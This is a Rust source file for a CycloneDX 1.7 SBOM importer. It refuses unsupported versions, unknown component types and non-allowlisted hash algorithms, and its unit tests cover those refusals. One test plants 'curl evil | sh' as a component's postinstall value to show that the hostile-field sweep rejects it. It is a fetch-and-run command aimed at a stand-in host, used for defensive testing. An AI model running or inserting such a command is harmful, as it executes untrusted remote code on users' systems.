//! The bounded CycloneDX 1.7 importer.
//!
//! A **parser**, and nothing else. It reads a document and produces normalized
//! components and edges. It does not resolve a purl, contact a registry, follow
//! an external reference or verify a hash against anything.
//!
//! Two decisions shape the whole module.
//!
//! **The version is checked, not guessed.** A document declaring `1.4` is
//! refused rather than read as though it were `1.7`. Field semantics change
//! between specification versions, and reading an older document with newer
//! assumptions produces a normalized model that describes something nobody
//! wrote.
//!
//! **An unmappable component type is refused, not defaulted.** CycloneDX's
//! `type` vocabulary is wider than this cycle's fourteen classes. Mapping an
//! unknown one onto `PACKAGE` would put a component in the graph while every
//! type-specific evidence requirement went unasked, which reads in a report as
//! a component that was assessed.

use std::collections::{BTreeMap, BTreeSet};

use serde_json::Value;

use crate::budget::AdmissionLedger;
use crate::component::{ArtifactDigest, Component, ComponentIdentifier, SupplierClaim};
use crate::error::{Result, SupplyChainError};
use crate::relationship::{RelationType, Relationship, RelationshipGraph};
use crate::schema::{assert_no_hostile_fields, enforce_document_size};
use crate::source::{ComponentType, DigestAlgorithm, EvidenceSource, ObservationKind};

/// The only CycloneDX spec version this importer will read.
pub const SUPPORTED_SPEC_VERSION: &str = "1.7";

/// CycloneDX component types this cycle can classify.
///
/// Deliberately partial. A type absent from this table is refused, because the
/// alternative is a component whose class nobody could read sitting in the
/// graph looking assessed.
fn map_component_type(value: &str) -> Option<ComponentType> {
    Some(match value {
        // `application` maps to PACKAGE, not AGENT.
        //
        // This was AGENT until the cross-format equivalence test caught it, and
        // the catch was the test doing its job. SPDX has no "application" type
        // — an application is a `software_Package` there — so the two formats
        // described the same system and produced different component classes.
        //
        // The deeper problem is that AGENT was an overreach either way. A BOM
        // says what a system is made of; being an *agent* is a role in an
        // agentic architecture, which a DARE manifest declares and a build tool
        // has no way to know. Inferring it from `type: application` would have
        // meant the engine asserting something no document said.
        "application" => ComponentType::Package,
        "framework" => ComponentType::Framework,
        "library" => ComponentType::Package,
        "container" => ComponentType::ContainerImage,
        "platform" => ComponentType::ServiceApi,
        "machine-learning-model" => ComponentType::Model,
        "data" => ComponentType::Dataset,
        "file" => ComponentType::PromptPolicyAsset,
        "device" | "device-driver" | "firmware" | "operating-system" => return None,
        _ => return None,
    })
}

fn map_hash_algorithm(value: &str) -> Option<DigestAlgorithm> {
    Some(match value {
        "SHA-256" => DigestAlgorithm::Sha256,
        "SHA-384" => DigestAlgorithm::Sha384,
        "SHA-512" => DigestAlgorithm::Sha512,
        "SHA3-256" => DigestAlgorithm::Sha3_256,
        "SHA3-512" => DigestAlgorithm::Sha3_512,
        _ => return None,
    })
}

/// What one CycloneDX document contributed.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ImportedBom {
    pub components: Vec<Component>,
    pub graph: RelationshipGraph,
}

/// Parse and normalize a CycloneDX 1.7 document.
///
/// The order is the frozen one: size, sweep, version, then structure. Each gate
/// runs before the next can matter.
pub fn import(raw: &[u8], ledger: &mut AdmissionLedger) -> Result<ImportedBom> {
    enforce_document_size(raw, "cyclonedx document")?;
    ledger.admit_bytes(raw.len(), "cyclonedx document")?;

    let document: Value = serde_json::from_slice(raw).map_err(|err| {
        SupplyChainError::schema(format!(
            "the CycloneDX document is not valid JSON (line {}, column {})",
            err.line(),
            err.column()
        ))
    })?;

    assert_no_hostile_fields(&document, "cyclonedx document")?;
    assert_supported_version(&document)?;

    let mut components = Vec::new();
    let mut graph = RelationshipGraph::new();

    for entry in document
        .get("components")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        ledger.admit_component()?;
        components.push(component_from(entry)?);
    }

    // `services` are recorded as component references rather than a second
    // model. A service the system talks to is a supply-chain component; giving
    // it its own shape would mean two models to keep in agreement.
    for entry in document
        .get("services")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        ledger.admit_component()?;
        components.push(service_from(entry)?);
    }

    for entry in document
        .get("dependencies")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        let source = entry
            .get("ref")
            .and_then(Value::as_str)
            .ok_or_else(|| SupplyChainError::schema("a dependency declares no ref".to_owned()))?;
        for target in entry
            .get("dependsOn")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
        {
            let target = target.as_str().ok_or_else(|| {
                SupplyChainError::schema("a dependency target is not a string".to_owned())
            })?;
            ledger.admit_relationship()?;
            graph.insert(Relationship {
                source_id: source.to_owned(),
                target_id: target.to_owned(),
                relation: RelationType::DependsOn,
                // A CycloneDX dependency records what the producing tool saw in
                // the build. It is an observation, not an approval — the
                // manifest is where a deployment declares what it expected.
                observation: ObservationKind::Observed,
                evidence_source: EvidenceSource::CycloneDx,
            })?;
        }
    }

    Ok(ImportedBom { components, graph })
}

fn assert_supported_version(document: &Value) -> Result<()> {
    let declared = document
        .get("specVersion")
        .and_then(Value::as_str)
        .ok_or_else(|| {
            SupplyChainError::schema(
                "the document declares no CycloneDX specVersion; reading it would mean \
                 guessing which specification's field semantics apply"
                    .to_owned(),
            )
        })?;

    if declared != SUPPORTED_SPEC_VERSION {
        return Err(SupplyChainError::schema(format!(
            "CycloneDX {declared} is not supported; this cycle reads {SUPPORTED_SPEC_VERSION}, \
             and field semantics change between versions"
        )));
    }
    if document.get("bomFormat").and_then(Value::as_str) != Some("CycloneDX") {
        return Err(SupplyChainError::schema(
            "the document does not declare bomFormat CycloneDX".to_owned(),
        ));
    }
    Ok(())
}

fn component_from(entry: &Value) -> Result<Component> {
    let declared_type = entry
        .get("type")
        .and_then(Value::as_str)
        .ok_or_else(|| SupplyChainError::schema("a component declares no type".to_owned()))?;

    let component_type = map_component_type(declared_type).ok_or_else(|| {
        SupplyChainError::schema(format!(
            "CycloneDX component type `{declared_type}` has no Cycle 019 class; mapping it onto \
             a nearby one would leave its evidence requirements unasked while it read as assessed"
        ))
    })?;

    let name = entry
        .get("name")
        .and_then(Value::as_str)
        .ok_or_else(|| SupplyChainError::schema("a component declares no name".to_owned()))?;

    let version = entry
        .get("version")
        .and_then(Value::as_str)
        .map(str::to_owned);

    // `bom-ref` is the document's own identifier and is what dependency edges
    // point at, so it is the id when present. Falling back to the name would
    // make edges dangle.
    let component_id = entry
        .get("bom-ref")
        .and_then(Value::as_str)
        .unwrap_or(name)
        .to_owned();

    let mut digests = BTreeSet::new();
    for hash in entry
        .get("hashes")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        let algorithm = hash
            .get("alg")
            .and_then(Value::as_str)
            .ok_or_else(|| SupplyChainError::schema("a hash declares no algorithm".to_owned()))?;
        let Some(algorithm) = map_hash_algorithm(algorithm) else {
            // Refused rather than skipped. Silently dropping a hash the engine
            // cannot compare would turn "we could not check this" into "there
            // was nothing to check".
            return Err(SupplyChainError::schema(format!(
                "hash algorithm `{algorithm}` is not allowlisted; a digest nobody can compare \
                 is a field that looks like integrity evidence and is not"
            )));
        };
        let content = hash
            .get("content")
            .and_then(Value::as_str)
            .ok_or_else(|| SupplyChainError::schema("a hash declares no content".to_owned()))?;
        digests.insert(ArtifactDigest {
            algorithm,
            value: content.to_ascii_lowercase(),
        });
    }

    let mut identifiers = BTreeSet::new();
    if let Some(purl) = entry.get("purl").and_then(Value::as_str) {
        identifiers.insert(ComponentIdentifier {
            kind: "purl".to_owned(),
            value: purl.to_owned(),
            immutable: false,
        });
    }
    if let Some(cpe) = entry.get("cpe").and_then(Value::as_str) {
        identifiers.insert(ComponentIdentifier {
            kind: "cpe".to_owned(),
            value: cpe.to_owned(),
            immutable: false,
        });
    }

    let supplier = SupplierClaim {
        supplier_id: entry
            .get("supplier")
            .and_then(|value| value.get("name"))
            .and_then(Value::as_str)
            .map(str::to_owned),
        publisher_id: entry
            .get("publisher")
            .and_then(Value::as_str)
            .map(str::to_owned),
        builder_id: None,
        signer_id: None,
        source_id: None,
    };

    let component = Component {
        component_id,
        component_type,
        name: name.to_owned(),
        version,
        digests,
        identifiers,
        supplier,
        // A CycloneDX document never establishes trust. The field stays empty
        // and the policy fills it, which is where approval lives.
        source_trust: None,
        capabilities: None,
        observation: ObservationKind::Observed,
        evidence_source: EvidenceSource::CycloneDx,
        metadata: BTreeMap::new(),
    };
    component.validate()?;
    Ok(component)
}

fn service_from(entry: &Value) -> Result<Component> {
    let name = entry
        .get("name")
        .and_then(Value::as_str)
        .ok_or_else(|| SupplyChainError::schema("a service declares no name".to_owned()))?;
    let component_id = entry
        .get("bom-ref")
        .and_then(Value::as_str)
        .unwrap_or(name)
        .to_owned();

    let component = Component {
        component_id,
        component_type: ComponentType::ServiceApi,
        name: name.to_owned(),
        version: entry
            .get("version")
            .and_then(Value::as_str)
            .map(str::to_owned),
        digests: BTreeSet::new(),
        identifiers: BTreeSet::new(),
        supplier: provider_or_default(entry),
        source_trust: None,
        capabilities: None,
        observation: ObservationKind::Observed,
        evidence_source: EvidenceSource::CycloneDx,
        metadata: BTreeMap::new(),
    };
    component.validate()?;
    Ok(component)
}

fn provider_or_default(entry: &Value) -> SupplierClaim {
    SupplierClaim {
        supplier_id: entry
            .get("provider")
            .and_then(|value| value.get("name"))
            .and_then(Value::as_str)
            .map(str::to_owned),
        ..SupplierClaim::default()
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use serde_json::json;

    pub(crate) fn document() -> Value {
        let sha = "a".repeat(64);
        json!({
            "bomFormat": "CycloneDX",
            "specVersion": "1.7",
            "version": 1,
            "components": [
                {
                    "type": "library",
                    "bom-ref": "react",
                    "name": "react",
                    "version": "18.3.1",
                    "purl": "pkg:npm/react@18.3.1",
                    "supplier": { "name": "acme" },
                    "hashes": [
                        { "alg": "SHA-256", "content": sha }
                    ]
                },
                {
                    "type": "application",
                    "bom-ref": "app",
                    "name": "planner-agent",
                    "version": "1.0.0"
                }
            ],
            "dependencies": [
                { "ref": "app", "dependsOn": ["react"] }
            ]
        })
    }

    fn import_value(value: &Value) -> Result<ImportedBom> {
        let raw = serde_json::to_vec(value).expect("serializes");
        import(&raw, &mut AdmissionLedger::new())
    }

    #[test]
    fn a_well_formed_document_normalizes() {
        let imported = import_value(&document()).expect("imports");
        assert_eq!(imported.components.len(), 2);
        assert_eq!(imported.graph.edges.len(), 1);

        let react = imported
            .components
            .iter()
            .find(|component| component.component_id == "react")
            .expect("present");
        assert_eq!(react.component_type, ComponentType::Package);
        assert_eq!(react.digests.len(), 1);
        assert_eq!(react.supplier.supplier_id.as_deref(), Some("acme"));
    }

    #[test]
    fn an_unsupported_spec_version_is_refused_rather_than_read_anyway() {
        // Field semantics change between versions. Reading a 1.4 document with
        // 1.7 assumptions produces a normalized model describing something
        // nobody wrote.
        let mut document = document();
        document["specVersion"] = json!("1.4");
        let err = import_value(&document).expect_err("must be refused");
        assert!(err.is_refusal());
        assert!(err.to_string().contains("1.4"));
    }

    #[test]
    fn a_document_with_no_declared_version_is_refused() {
        let mut document = document();
        document
            .as_object_mut()
            .expect("object")
            .remove("specVersion");
        assert!(import_value(&document).is_err());
    }

    #[test]
    fn an_unmappable_component_type_is_refused_rather_than_defaulted() {
        // Mapping an unknown type onto PACKAGE would put a component in the
        // graph with its evidence requirements unasked, reading in a report as
        // a component that was assessed.
        let mut document = document();
        document["components"][0]["type"] = json!("firmware");
        let err = import_value(&document).expect_err("must be refused");
        assert!(err.to_string().contains("firmware"));
    }

    #[test]
    fn an_unallowlisted_hash_algorithm_is_refused_rather_than_skipped() {
        // Silently dropping a hash the engine cannot compare would turn "we
        // could not check this" into "there was nothing to check".
        let mut document = document();
        document["components"][0]["hashes"] = json!([{ "alg": "MD5", "content": "0".repeat(32) }]);
        let err = import_value(&document).expect_err("must be refused");
        assert!(err.to_string().contains("MD5"));
    }

    #[test]
    fn an_uppercase_hash_is_normalized_to_lowercase_on_import() {
        // The one normalization the importer performs, and it is safe: the
        // model refuses uppercase, so the choice is normalizing here or
        // refusing every document whose tool emitted uppercase.
        let mut document = document();
        document["components"][0]["hashes"] =
            json!([{ "alg": "SHA-256", "content": "A".repeat(64) }]);
        let imported = import_value(&document).expect("imports");
        let react = &imported.components[0];
        assert_eq!(
            react.digests.iter().next().expect("digest").value,
            "a".repeat(64)
        );
    }

    #[test]
    fn a_dependency_is_recorded_as_observed_and_never_as_approved() {
        // A CycloneDX dependency records what the producing tool saw. Marking
        // it declared would make the document its own expectation, and the
        // declared/observed comparison would compare a thing to itself.
        let imported = import_value(&document()).expect("imports");
        let edge = imported.graph.edges.iter().next().expect("one edge");
        assert_eq!(edge.observation, ObservationKind::Observed);
        assert_eq!(edge.evidence_source, EvidenceSource::CycloneDx);
    }

    #[test]
    fn an_imported_component_never_carries_trust() {
        // Approval lives in the local policy. A parser that filled this in
        // would let a document approve itself.
        let imported = import_value(&document()).expect("imports");
        for component in &imported.components {
            assert!(component.source_trust.is_none());
        }
    }

    #[test]
    fn a_hostile_field_is_refused_before_any_component_is_built() {
        let mut document = document();
        document["components"][0]["postinstall"] = json!("curl evil | sh");
        let err = import_value(&document).expect_err("must be refused");
        assert!(err.is_refusal());
    }

    #[test]
    fn external_references_are_read_as_inert_metadata() {
        // The document is full of coordinates and must stay readable. Refusing
        // them would refuse every real BOM.
        let mut document = document();
        document["components"][0]["externalReferences"] = json!([
            { "type": "distribution", "url": "https://registry.npmjs.org/react" }
        ]);
        import_value(&document).expect("a real BOM stays readable");
    }

    #[test]
    fn services_become_components_rather_than_a_second_model() {
        let mut document = document();
        document["services"] = json!([
            { "bom-ref": "billing-api", "name": "billing", "provider": { "name": "acme" } }
        ]);
        let imported = import_value(&document).expect("imports");
        let service = imported
            .components
            .iter()
            .find(|component| component.component_id == "billing-api")
            .expect("present");
        assert_eq!(service.component_type, ComponentType::ServiceApi);
    }

    #[test]
    fn the_ledger_admits_before_the_model_is_built() {
        // Admission precedes normalization: a document over the component
        // ceiling must be refused before its components exist.
        let mut document = document();
        let mut components = Vec::new();
        for index in 0..(crate::limits::HARD_MAX_COMPONENTS + 1) {
            components.push(json!({
                "type": "library",
                "bom-ref": format!("c{index}"),
                "name": format!("c{index}")
            }));
        }
        document["components"] = json!(components);
        document
            .as_object_mut()
            .expect("object")
            .remove("dependencies");

        let err = import_value(&document).expect_err("must be refused");
        assert!(matches!(err, SupplyChainError::BudgetExhausted(_)));
    }

    #[test]
    fn an_empty_document_imports_to_nothing_rather_than_failing() {
        // A BOM with no components is a description of a system with no
        // external components. That is an answer, not an error.
        let document = json!({ "bomFormat": "CycloneDX", "specVersion": "1.7", "version": 1 });
        let imported = import_value(&document).expect("imports");
        assert!(imported.components.is_empty());
        assert!(imported.graph.edges.is_empty());
    }
}
